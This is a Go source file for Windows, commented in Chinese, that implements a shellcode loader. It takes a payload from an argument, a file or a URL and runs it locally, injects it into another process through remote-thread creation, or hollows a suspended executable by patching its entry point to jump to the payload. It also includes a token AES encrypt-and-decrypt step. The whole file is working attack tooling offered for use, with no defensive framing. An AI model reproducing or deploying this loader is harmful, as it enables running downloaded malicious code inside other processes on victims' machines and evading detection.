//go:build windows

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

// 加密配置结构体
type EncryptionConfig struct {
	Key []byte
	IV  []byte
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	shellcodeIn := flag.String("i", "", "specify raw shellcode (as bytes)")
	shellcodeFile := flag.String("f", "", "take shellcode from a file")
	shellcodeUrl := flag.String("u", "", "download shellcode from a url")
	processId := flag.Int("p", 0, "process to migrate into (optional)")
	processName := flag.String("n", "", "process name to inject into (optional)")
	hollowPath := flag.String("e", "", "executable path to launch and hollow (optional)")
	debug := flag.Bool("debug", false, "enable debug output")
	flag.Parse()

	// 获取原始shellcode
	shellcode, err := getShellCode(shellcodeIn, shellcodeFile, shellcodeUrl)
	if err != nil {
		log.Fatalf("Failed to get shellcode: %v", err)
	}

	// 生成随机加密配置
	encConfig, err := generateEncryptionConfig()
	if err != nil {
		log.Fatalf("Failed to generate encryption config: %v", err)
	}

	// 加密shellcode
	encryptedShellcode, err := encryptAES(shellcode, encConfig)
	if err != nil {
		log.Fatalf("Failed to encrypt shellcode: %v", err)
	}

	// 解密shellcode
	shellcode, err = decryptAES(encryptedShellcode, encConfig)
	if err != nil {
		log.Fatalf("Failed to decrypt shellcode: %v", err)
	}

	if *debug {
		log.Printf("Shellcode length: %d bytes", len(shellcode))
	}

	if *processId > 0 {
		if err := tryInjectShellCode(*processId, shellcode); err != nil {
			log.Fatalf("Failed to inject shellcode: %v", err)
		}
	} else if *processName != "" {
		pid, err := findProcessByName(*processName)
		if err != nil {
			log.Fatalf("Failed to find process: %v", err)
		}
		if err := tryInjectShellCode(pid, shellcode); err != nil {
			log.Fatalf("Failed to inject shellcode: %v", err)
		}
	} else if len(*hollowPath) > 0 {
		if err := tryHollowExecutable(*hollowPath, shellcode, *debug); err != nil {
			log.Fatalf("Failed to hollow executable: %v", err)
		}
	} else {
		if err := tryRunShellCode(shellcode); err != nil {
			log.Fatalf("Failed to run shellcode: %v", err)
		}
	}
}

// 生成随机加密配置
func generateEncryptionConfig() (*EncryptionConfig, error) {
	key := make([]byte, 32) // 使用256位AES密钥
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return nil, err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	return &EncryptionConfig{
		Key: key,
		IV:  iv,
	}, nil
}

// AES加密函数
func encryptAES(data []byte, config *EncryptionConfig) ([]byte, error) {
	block, err := aes.NewCipher(config.Key)
	if err != nil {
		return nil, err
	}

	padded := pkcs7Padding(data, aes.BlockSize)
	encrypted := make([]byte, len(padded))
	mode := cipher.NewCBCEncrypter(block, config.IV)
	mode.CryptBlocks(encrypted, padded)

	// 返回IV+加密数据
	return append(config.IV, encrypted...), nil
}

// AES解密函数
func decryptAES(data []byte, config *EncryptionConfig) ([]byte, error) {
	block, err := aes.NewCipher(config.Key)
	if err != nil {
		return nil, err
	}

	if len(data) < aes.BlockSize {
		return nil, fmt.Errorf("data too short")
	}

	iv := data[:aes.BlockSize]
	data = data[aes.BlockSize:]

	if len(data)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("data is not a multiple of block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(data))
	mode.CryptBlocks(decrypted, data)

	return pkcs7UnPadding(decrypted)
}

// PKCS7填充
func pkcs7Padding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padtext...)
}

// PKCS7去填充
func pkcs7UnPadding(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, fmt.Errorf("invalid padding size")
	}
	unpadding := int(data[length-1])
	if unpadding > length {
		return nil, fmt.Errorf("invalid padding size")
	}
	return data[:(length - unpadding)], nil
}

// 通过进程名查找PID
func findProcessByName(name string) (int, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = windows.Process32First(snapshot, &pe)
	if err != nil {
		return 0, err
	}

	for {
		processName := windows.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(processName, name) {
			return int(pe.ProcessID), nil
		}

		err = windows.Process32Next(snapshot, &pe)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return 0, err
		}
	}

	return 0, fmt.Errorf("process not found: %s", name)
}

func tryRunShellCode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("invalid shellcode: empty")
	}

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	rtlMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	createThread := kernel32.MustFindProc("CreateThread")
	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")

	destAddress, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	if destAddress == 0 {
		return fmt.Errorf("VirtualAlloc failed: %v", err)
	}

	_, _, err = rtlMoveMemory.Call(destAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("RtlMoveMemory failed: %v", err)
	}

	threadHandle, _, err := createThread.Call(0, 0, destAddress, 0, 0, 0)
	if threadHandle == 0 {
		return fmt.Errorf("CreateThread failed: %v", err)
	}

	_, _, err = waitForSingleObject.Call(threadHandle, 0xFFFFFFFF)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("WaitForSingleObject failed: %v", err)
	}

	return nil
}

func tryInjectShellCode(processID int, shellcode []byte) error {
	if processID <= 0 {
		return fmt.Errorf("invalid process ID")
	}

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	openProcess := kernel32.MustFindProc("OpenProcess")
	virtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread := kernel32.MustFindProc("CreateRemoteThread")

	handle, _, err := openProcess.Call(0x001F0FFF, 0, uintptr(processID))
	if handle == 0 {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}

	destAddress, _, err := virtualAllocEx.Call(handle, 0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	if destAddress == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	_, _, err = writeProcessMemory.Call(handle, destAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	threadHandle, _, err := createRemoteThread.Call(handle, 0, 0, destAddress, 0, 0, 0)
	if threadHandle == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %v", err)
	}

	return nil
}

func tryHollowExecutable(path string, shellcode []byte, debug bool) error {
	debugLog(debug, "[+] Starting process hollowing for: %s", path)

	_, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("invalid path: %v", err)
	}

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	createProcessA := kernel32.MustFindProc("CreateProcessA")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	virtualProtectEx := kernel32.MustFindProc("VirtualProtectEx")
	virtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
	resumeThread := kernel32.MustFindProc("ResumeThread")
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	zwQueryInformationProcess := ntdll.MustFindProc("ZwQueryInformationProcess")

	startupInfo := &syscall.StartupInfo{}
	processInfo := &syscall.ProcessInformation{}
	pathArray := append([]byte(path), byte(0))

	debugLog(debug, "[+] Creating suspended process")
	ret, _, err := createProcessA.Call(
		0,
		uintptr(unsafe.Pointer(&pathArray[0])),
		0,
		0,
		0,
		0x4, // CREATE_SUSPENDED
		0,
		0,
		uintptr(unsafe.Pointer(startupInfo)),
		uintptr(unsafe.Pointer(processInfo)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessA failed: %v", err)
	}
	debugLog(debug, "[+] Process created with PID: %d", processInfo.ProcessId)

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	tmp := 0

	debugLog(debug, "[+] Querying process information")
	_, _, err = zwQueryInformationProcess.Call(
		uintptr(processInfo.Process),
		0,
		uintptr(unsafe.Pointer(basicInfo)),
		pointerSize*6,
		uintptr(unsafe.Pointer(&tmp)),
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("ZwQueryInformationProcess failed: %v", err)
	}

	imageBaseAddress := basicInfo.PebAddress + 0x10
	debugLog(debug, "[+] PEB address: 0x%x", basicInfo.PebAddress)
	debugLog(debug, "[+] Image base address location: 0x%x", imageBaseAddress)

	addressBuffer := make([]byte, pointerSize)
	read := 0

	debugLog(debug, "[+] Reading process memory for image base")
	_, _, err = readProcessMemory.Call(
		uintptr(processInfo.Process),
		imageBaseAddress,
		uintptr(unsafe.Pointer(&addressBuffer[0])),
		uintptr(len(addressBuffer)),
		uintptr(unsafe.Pointer(&read)),
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory failed: %v", err)
	}

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	debugLog(debug, "[+] Image base: 0x%x", imageBaseValue)

	// 读取DOS头和NT头
	headerBuffer := make([]byte, 0x1000)
	_, _, err = readProcessMemory.Call(
		uintptr(processInfo.Process),
		uintptr(imageBaseValue),
		uintptr(unsafe.Pointer(&headerBuffer[0])),
		uintptr(len(headerBuffer)),
		uintptr(unsafe.Pointer(&read)),
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory failed for PE headers: %v", err)
	}

	// 获取原始入口点
	lfaNewPos := headerBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := headerBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)

	debugLog(debug, "[+] Original entry point RVA: 0x%x", entrypointRVA)
	debugLog(debug, "[+] Original entry point address: 0x%x", entrypointAddress)

	// 保存原始入口点代码
	originalCode := make([]byte, 32)
	_, _, err = readProcessMemory.Call(
		uintptr(processInfo.Process),
		uintptr(entrypointAddress),
		uintptr(unsafe.Pointer(&originalCode[0])),
		uintptr(len(originalCode)),
		uintptr(unsafe.Pointer(&read)),
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("ReadProcessMemory failed for original code: %v", err)
	}

	// 创建包装器代码空间
	wrapperSize := len(shellcode) + 100 // 额外空间用于包装代码
	wrapperMemory, _, err := virtualAllocEx.Call(
		uintptr(processInfo.Process),
		0,
		uintptr(wrapperSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if wrapperMemory == 0 {
		return fmt.Errorf("VirtualAllocEx failed for wrapper: %v", err)
	}
	debugLog(debug, "[+] Allocated wrapper memory at: 0x%x", wrapperMemory)

	// 构建包装器代码
	// 保存寄存器
	wrapperCode := []byte{
		0x50,       // push rax
		0x51,       // push rcx
		0x52,       // push rdx
		0x53,       // push rbx
		0x54,       // push rsp
		0x55,       // push rbp
		0x56,       // push rsi
		0x57,       // push rdi
		0x41, 0x50, // push r8
		0x41, 0x51, // push r9
		0x41, 0x52, // push r10
		0x41, 0x53, // push r11
		0x41, 0x54, // push r12
		0x41, 0x55, // push r13
		0x41, 0x56, // push r14
		0x41, 0x57, // push r15
		0x9C, // pushfq
	}

	// 添加shellcode
	wrapperCode = append(wrapperCode, shellcode...)

	// 恢复寄存器
	restoreRegisters := []byte{
		0x9D,       // popfq
		0x41, 0x5F, // pop r15
		0x41, 0x5E, // pop r14
		0x41, 0x5D, // pop r13
		0x41, 0x5C, // pop r12
		0x41, 0x5B, // pop r11
		0x41, 0x5A, // pop r10
		0x41, 0x59, // pop r9
		0x41, 0x58, // pop r8
		0x5F, // pop rdi
		0x5E, // pop rsi
		0x5D, // pop rbp
		0x5C, // pop rsp
		0x5B, // pop rbx
		0x5A, // pop rdx
		0x59, // pop rcx
		0x58, // pop rax
	}
	wrapperCode = append(wrapperCode, restoreRegisters...)

	// 添加跳转回原始入口点的代码
	jumpBack := []byte{
		0x48, 0xB8, // mov rax,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <original entry point>
		0xFF, 0xE0, // jmp rax
	}
	binary.LittleEndian.PutUint64(jumpBack[2:], entrypointAddress)
	wrapperCode = append(wrapperCode, jumpBack...)

	// 写入包装器代码
	debugLog(debug, "[+] Writing wrapper code")
	_, _, err = writeProcessMemory.Call(
		uintptr(processInfo.Process),
		wrapperMemory,
		uintptr(unsafe.Pointer(&wrapperCode[0])),
		uintptr(len(wrapperCode)),
		0,
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("WriteProcessMemory failed for wrapper code: %v", err)
	}

	// 修改入口点跳转到包装器
	jumpToWrapper := []byte{
		0x48, 0xB8, // mov rax,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // <wrapper address>
		0xFF, 0xE0, // jmp rax
	}
	binary.LittleEndian.PutUint64(jumpToWrapper[2:], uint64(wrapperMemory))

	// 修改入口点保护属性
	var oldProtect uint32
	debugLog(debug, "[+] Changing memory protection of original entry point")
	ret, _, err = virtualProtectEx.Call(
		uintptr(processInfo.Process),
		uintptr(entrypointAddress),
		uintptr(len(jumpToWrapper)),
		0x40, // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtectEx failed: %v", err)
	}

	// 写入跳转到包装器的代码
	debugLog(debug, "[+] Writing jump to wrapper")
	_, _, err = writeProcessMemory.Call(
		uintptr(processInfo.Process),
		uintptr(entrypointAddress),
		uintptr(unsafe.Pointer(&jumpToWrapper[0])),
		uintptr(len(jumpToWrapper)),
		0,
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("WriteProcessMemory failed for jump code: %v", err)
	}

	// 恢复入口点内存保护
	debugLog(debug, "[+] Restoring memory protection")
	ret, _, err = virtualProtectEx.Call(
		uintptr(processInfo.Process),
		uintptr(entrypointAddress),
		uintptr(len(jumpToWrapper)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		debugLog(debug, "[!] Warning: Failed to restore memory protection: %v", err)
	}

	debugLog(debug, "[+] Resuming thread")
	_, _, err = resumeThread.Call(uintptr(processInfo.Thread))
	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("ResumeThread failed: %v", err)
	}

	// 清理句柄
	syscall.CloseHandle(processInfo.Process)
	syscall.CloseHandle(processInfo.Thread)

	debugLog(debug, "[+] Process hollowing completed successfully")
	return nil
}

func getShellCode(shellcodeIn, shellcodeFile, shellcodeUrl *string) ([]byte, error) {
	if len(*shellcodeIn) > 0 && len(*shellcodeFile) == 0 && len(*shellcodeUrl) == 0 {
		return []byte(*shellcodeIn), nil
	}

	if len(*shellcodeFile) > 0 && len(*shellcodeIn) == 0 && len(*shellcodeUrl) == 0 {
		s, err := ioutil.ReadFile(*shellcodeFile)
		if err != nil {
			return nil, fmt.Errorf("invalid or unreadable file path: %v", err)
		}
		return s, nil
	}

	if len(*shellcodeUrl) > 0 && len(*shellcodeIn) == 0 && len(*shellcodeFile) == 0 {
		client := &http.Client{}
		req, err := http.NewRequest(http.MethodGet, *shellcodeUrl, nil)
		if err != nil {
			return nil, fmt.Errorf("failed to create request: %v", err)
		}

		resp, err := client.Do(req)
		if err != nil {
			return nil, fmt.Errorf("failed to download shellcode: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			return nil, fmt.Errorf("unable to download from %s: %d", *shellcodeUrl, resp.StatusCode)
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("failed to read response body: %v", err)
		}

		if len(body) == 0 {
			return nil, fmt.Errorf("downloaded shellcode is empty")
		}

		return body, nil
	}

	return nil, fmt.Errorf("please provide shellcode either directly (-i), from a file (-f) or from a url (-u)")
}

// 添加调试日志辅助函数
func debugLog(debug bool, format string, v ...interface{}) {
	if debug {
		log.Printf(format, v...)
	}
}
